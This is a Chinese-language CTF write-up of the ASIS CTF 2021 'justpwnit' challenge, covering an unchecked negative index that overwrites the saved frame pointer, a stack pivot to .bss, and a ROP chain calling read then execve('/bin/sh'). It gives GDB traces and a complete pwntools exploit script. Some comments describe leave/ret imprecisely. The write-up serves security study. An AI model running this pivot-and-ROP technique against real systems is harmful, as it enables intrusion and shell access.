---
title: asisctf2021_justpwnit
top: false
comment: false
lang: zh-CN
date: 2021-11-07 12:40:07
tags:
categories:
  - CTF
  - PWN
  - wp
  - asisctf
  - asisctf2021
---

# asisctf2021_justpwnit

这次比赛中科院信工所的NeSE战队拿到了第四名的好成绩，借比赛的一道warm up题复习一下stack pivot的知识；

![NeSE_score](./asisctf2021-justpwnit/NeSE.jpg)

## 信息收集

### chekcsec

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

### 程序执行

```
Index: 0
Data: hello
Index: 1
Data: hi
Index: 2
Data: klose
Index: 3
Data: pwn
```

### 源码&IDA分析

题目提供了源码，直接对源码进行分析

```c
/*
 * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define STR_SIZE 0x80

void set_element(char **parray) {
  int index;
  printf("Index: ");
  if (scanf("%d%*c", &index) != 1)
    exit(1);
  if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))
    exit(1);
  printf("Data: ");
  if (!fgets(parray[index], STR_SIZE, stdin))
    exit(1);
}

void justpwnit() {
  char *array[4];
  for (int i = 0; i < 4; i++) {
    set_element(array);    // array作为set_element()的参数
  }
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(180);
  justpwnit();
  return 0;
}

```

可以看到，在获取用户输入的index时，并没有对index进行检测，这样堆指针将可能被用户控制，从而越界修改任意值；

在IDA中可以看到，指针由rbx寄存器存储；

```c
__int64 __fastcall set_element(__int64 a1)
{
  __int64 *v1; // rbx
 ...
  v1 = (__int64 *)(8LL * v3 + a1);
  *v1 = calloc(1uLL, 0x80uLL);
 ...
}
```

### GDB调试

找到`call calloc`的位置，并把断点设置在其下一行，观察申请堆块后，栈帧的情况；

```
.text:00000000004011A1                 call    calloc
.text:00000000004011A6                 mov     [rbx], rax     // breakpoint is here
.text:00000000004011A9                 mov     rax, [rbx]
```

第一次输入`0`，执行后，可以看到如下的栈结构；

```
pwndbg> stack 20
00:0000│ rsp  0x7fffffffdc30 ◂— 0x0
01:0008│      0x7fffffffdc38 —▸ 0x7fffffffdc70 ◂— 0xb4
02:0010│      0x7fffffffdc40 ◂— 0x0
03:0018│      0x7fffffffdc48 —▸ 0x403d3f (setitimer+23) ◂— pop    rdx
04:0020│      0x7fffffffdc50 ◂— 0x0
05:0028│      0x7fffffffdc58 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbp  0x7fffffffdc60 —▸ 0x7fffffffdca0 —▸ 0x7fffffffdcb0 ◂— 0x1
07:0038│      0x7fffffffdc68 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│ rbx  0x7fffffffdc70 ◂— 0xb4
09:0048│      0x7fffffffdc78 ◂— 0x0
...
```

可以看到rbx寄存器的位置，距离rbp有0x10的距离；

第二次输入-2，执行后，可以看到如下的栈结构；

```
pwndbg> stack 20
00:0000│ rsp      0x7fffffffdc30 ◂— 0x0
01:0008│          0x7fffffffdc38 —▸ 0x7fffffffdc70 ◂— 0xb4
02:0010│          0x7fffffffdc40 ◂— 0x0
03:0018│          0x7fffffffdc48 ◂— 0xfffffffe00403d3f /* '?=@' */
04:0020│          0x7fffffffdc50 ◂— 0x0
05:0028│          0x7fffffffdc58 —▸ 0x40123d (main) ◂— endbr64 
06:0030│ rbx rbp  0x7fffffffdc60 —▸ 0x7fffffffdca0 —▸ 0x7fffffffdcb0 ◂— 0x1
07:0038│          0x7fffffffdc68 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│          0x7fffffffdc70 ◂— 0xb4
09:0048│          0x7fffffffdc78 ◂— 0x0
...
```

此时，rbx和rbp处在同一位置，这也是堆指针所在的位置，即可以控制rbp的内容；

## 漏洞利用

利用这一点，可以进行stack pivot攻击；

### pivot

首先选择.bss段来存放输入的payload；

```python
bss_addr = 0x40C240 + 0x300    # 0x40C240 is the start address of .bss section
```

接着调用`sys_read()`来读入payload；

```python
# read(%rdi, %rsi, %rdx)
                                                    # leave = mov rbp,rsp; jmp rsp
payload1  = p64(0)                                  # mov rbp, rsp -> rsp point this code
                                                    # then pop rbp -> rsp-4 -> rsp point to next code
payload1 += p64(pop_rdx_ret) + p64(0x100)           # rdx --size
payload1 += p64(pop_rsi_ret) + p64(bss_addr)        # rsi --addr
payload1 += p64(pop_rdi_ret) + p64(0)               # rdi --fd
payload1 += p64(pop_rax_ret) + p64(0)               # rax --syscall number
payload1 += p64(syscall)                            # syscall
payload1 += p64(pop_rbp_ret) + p64(bss_addr)        # rbp->bss_addr
payload1 += p64(leave_ret)
```

继续调试，跟踪执行，在`call fgets_unlocked`后，要执行的payload被打入指针所指向的位置；

```
pwndbg> stack 20
00:0000│ rsp      0x7ffe517a3190 ◂— 0x0
...
06:0030│ rbx rbp  0x7ffe517a31c0 —▸ 0x7f68494ab050 ◂— 0x0
07:0038│          0x7ffe517a31c8 —▸ 0x40122f (justpwnit+33) ◂— add    dword ptr [rbp - 4], 1
08:0040│          0x7ffe517a31d0 ◂— 0xb4
09:0048│          0x7ffe517a31d8 ◂— 0x0
```

观察rbx所在的指针所指的内容；

```
pwndbg> telescope 0x7f68494ab050
00:0000│ rax  0x7f68494ab050 ◂— 0x0
01:0008│      0x7f68494ab058 —▸ 0x403d23 (wctomb+17) ◂— pop    rdx
02:0010│      0x7f68494ab060 ◂— 0x100
03:0018│      0x7f68494ab068 —▸ 0x4019a3 (mmap64+197) ◂— pop    rsi
04:0020│      0x7f68494ab070 —▸ 0x40c540 (buf+704) ◂— 0x0
05:0028│      0x7f68494ab078 —▸ 0x401b0d (fgets_unlocked+360) ◂— pop    rdi
06:0030│      0x7f68494ab080 ◂— 0x0
07:0038│      0x7f68494ab088 —▸ 0x401001 (_init+1) ◂— pop    rax
08:0040│      0x7f68494ab090 ◂— 0x0
09:0048│      0x7f68494ab098 —▸ 0x403888 (__unlock+59) ◂— syscall 
0a:0050│      0x7f68494ab0a0 —▸ 0x401123 (__do_global_dtors_aux+51) ◂— pop    rbp
0b:0058│      0x7f68494ab0a8 —▸ 0x40c540 (buf+704) ◂— 0x0
0c:0060│      0x7f68494ab0b0 —▸ 0x40123b (justpwnit+45) ◂— leave  
```

可以看到payload已经打入，现在观察程序是如何跳转执行这段payload的；

接下来程序执行的是这两条指令，进行跳转：

```
   0x4011f7 <set_element+190>    test   rax, rax
 ► 0x4011fa <set_element+193>  ✔ jne    set_element+205 <0x401206>

```

接着指令会执行：

```
   0x401207 <set_element+206>    add    rsp, 0x28
 ► 0x40120b <set_element+210>    pop    rbx
   0x40120c <set_element+211>    pop    rbp
   0x40120d <set_element+212>    ret    
```

这是很关键的一步，经过`rsp+0x28`释放栈空间后，将对rbx（局部参数用到的寄存器）和基址寄存器rbp进行恢复，即pop操作；

执行`pop rbx`后，`rsp+8`和rbp指向同一地址；

执行`pop rbp`后，rbp将指向伪造的栈空间，即下方代码块的`0x7f68494ab050`；

```
RBP  0x7f68494ab050 ◂— 0x0
```

而执行`ret`操作，相当于执行`pop rip; jmp rsp;`；`pop rip`使得`rsp+8`，rsp指向了`ret_addr`，因此在`jmp rsp`时，得以让程序继续返回到指定地址去执行；

接着关键之处来了，此时rbp已经被修改为：

```
RBP  0x7f68494ab050 ◂— 0x0
```

继续执行：

```
 ► 0x40123b <justpwnit+45>    leave  
   0x40123c <justpwnit+46>    ret    
```

`leave`操作相当于`mov rsp, rbp; pop rbp;`，即`rsp->rbp->0x7f68494ab050, rbp->0, rsp-4`因此可以看到，rsp指向了原来rbp所指内容的下一行`0x7f68494ab058`：

```
00:0000│ rsp  0x7f68494ab058 —▸ 0x403d23 (wctomb+17) ◂— pop    rdx
01:0008│      0x7f68494ab060 ◂— 0x100
02:0010│      0x7f68494ab068 —▸ 0x4019a3 (mmap64+197) ◂— pop    rsi
```

`ret`将`pop rip; jmp rsp`，并且`rsp+4`，此时程序顺利跳转到了伪造的栈上，如下；

```
RIP  0x403d23 (wctomb+17) ◂— pop    rdx
--------------------------------------------------------------------------
   0x40123b <justpwnit+45>          leave  
   0x40123c <justpwnit+46>          ret    
    ↓
 ► 0x403d23 <wctomb+17>             pop    rdx
   0x403d24 <wctomb+18>             ret    
---------------------------------------------------------------------------
00:0000│ rsp  0x7f68494ab060 ◂— 0x100
01:0008│      0x7f68494ab068 —▸ 0x4019a3 (mmap64+197) ◂— pop    rsi
02:0010│      0x7f68494ab070 —▸ 0x40c540 (buf+704) ◂— 0x0
03:0018│      0x7f68494ab078 —▸ 0x401b0d (fgets_unlocked+360) ◂— pop    rdi
04:0020│      0x7f68494ab080 ◂— 0x0
05:0028│      0x7f68494ab088 —▸ 0x401001 (_init+1) ◂— pop    rax
06:0030│      0x7f68494ab090 ◂— 0x0
07:0038│      0x7f68494ab098 —▸ 0x403888 (__unlock+59) ◂— syscall 
```

程序继续执行，将执行`sys_read()`相关汇编代码指令；

```
 ► 0x403888 <__unlock+59>           syscall  <SYS_read>
        fd: 0x0
        buf: 0x40c540 (buf+704) ◂— 0x0
        nbytes: 0x100

```

用户输入getshell的系统调用：

### execve

```python
payload2  = '/bin/sh\x00'
payload2 += p64(pop_rdx_ret) + p64(0)               # rdx --envp
payload2 += p64(pop_rsi_ret) + p64(0)               # rsi --argv
payload2 += p64(pop_rdi_ret) + p64(bss_addr)        # rdi --file,addr
payload2 += p64(pop_rax_ret) + p64(0x3b)            # rax --syscall number
payload2 += p64(syscall)                            # syscall
p.sendline(payload2)
```

接着执行：

```
 ► 0x401123 <__do_global_dtors_aux+51>    pop    rbp
   0x401124 <__do_global_dtors_aux+52>    ret             <0x40123b; justpwnit+45>
 ---------------------------------------------------------------------------------
00:0000│ rsp  0x7f68494ab0a8 —▸ 0x40c540 (buf+704) ◂— 0x68732f6e69622f /* '/bin/sh' */
01:0008│      0x7f68494ab0b0 —▸ 0x40123b (justpwnit+45) ◂— leave  

```

`pop rbp`将`mov rsp, rbp`，rbp指向了rsp，即`rbp->0x7f68494ab0a8`；

当执行`ret`后，将执行`leave`操作；

```
 ► 0x40123b <justpwnit+45>                leave  
   0x40123c <justpwnit+46>                ret 
```

`leave`操作将使rsp指向rbp，`ret`操作将跳转到rsp，因此程序执行来到了`0x40c540`，即.bss段上；

```
00:0000│ rsp  0x40c550 (buf+720) ◂— 0x0
01:0008│      0x40c558 (buf+728) —▸ 0x4019a3 (mmap64+197) ◂— pop    rsi
02:0010│      0x40c560 (buf+736) ◂— 0x0
03:0018│      0x40c568 (buf+744) —▸ 0x401b0d (fgets_unlocked+360) ◂— pop    rdi
04:0020│      0x40c570 (buf+752) —▸ 0x40c540 (buf+704) ◂— 0x68732f6e69622f /* '/bin/sh' */
05:0028│      0x40c578 (buf+760) —▸ 0x401001 (_init+1) ◂— pop    rax
06:0030│      0x40c580 (buf+768) ◂— 0x3b /* ';' */
07:0038│      0x40c588 (buf+776) —▸ 0x403888 (__unlock+59) ◂— syscall 

```

依次执行后能得到shell；

```
 ► 0x403888 <__unlock+59>           syscall  <SYS_execve>
        path: 0x40c540 (buf+704) ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x0
        envp: 0x0
---------------------------------------------------------------------
pwndbg> n
process 4252 is executing new program: /bin/dash

```

exp如下：

```python
# coding:utf-8

from elftools.construct.adapters import LengthValueAdapter
from pwn import *
elf = ELF('./justpwnit')

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def senddata(idx, data):
    p.recvuntil(": ")
    p.sendline(str(idx))
    p.recvuntil(": ")
    p.sendline(data)

p = process("./justpwnit")
bss_addr = 0x40C240 + 0x300
pop_rdi_ret = 0x401b0d
pop_rsi_ret = 0x4019a3
pop_rdx_ret = 0x403d23
pop_rax_ret = 0x401001
pop_rbx_ret = 0x40142b
pop_rbp_ret = 0x401123
leave_ret = 0x40123b
syscall = 0x403888

# read(%rdi, %rsi, %rdx)
                                                    # leave = mov rbp,rsp; jmp rsp
payload1  = p64(1)                                  # mov rbp, rsp -> rsp point this code
                                                    # then pop rbp -> rsp-4 -> rsp point to next code
payload1 += p64(pop_rdx_ret) + p64(0x100)           # rdx --size
payload1 += p64(pop_rsi_ret) + p64(bss_addr)        # rsi --addr
payload1 += p64(pop_rdi_ret) + p64(0)               # rdi --fd
payload1 += p64(pop_rax_ret) + p64(0)               # rax --syscall number
payload1 += p64(syscall)                            # syscall
payload1 += p64(pop_rbp_ret) + p64(bss_addr)        # rbp->bss_addr
payload1 += p64(leave_ret)
senddata(-2,payload1)


payload2  = '/bin/sh\x00'
payload2 += p64(pop_rdx_ret) + p64(0)               # rdx --envp
payload2 += p64(pop_rsi_ret) + p64(0)               # rsi --argv
payload2 += p64(pop_rdi_ret) + p64(bss_addr)        # rdi --file,addr
payload2 += p64(pop_rax_ret) + p64(0x3b)            # rax --syscall number
payload2 += p64(syscall)                            # syscall
p.sendline(payload2)

p.interactive()
```

拿flag；

```
klose@ubuntu:~/ctf/pwn/file/asisctf_2021/just_pwn_it$ python exploit.py 
[*] '/home/klose/ctf/pwn/file/asisctf_2021/just_pwn_it/justpwnit'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './justpwnit': pid 6555
[*] Switching to interactive mode
$ cat /flag
flag{K1os32J0yc34ever}
$  

```

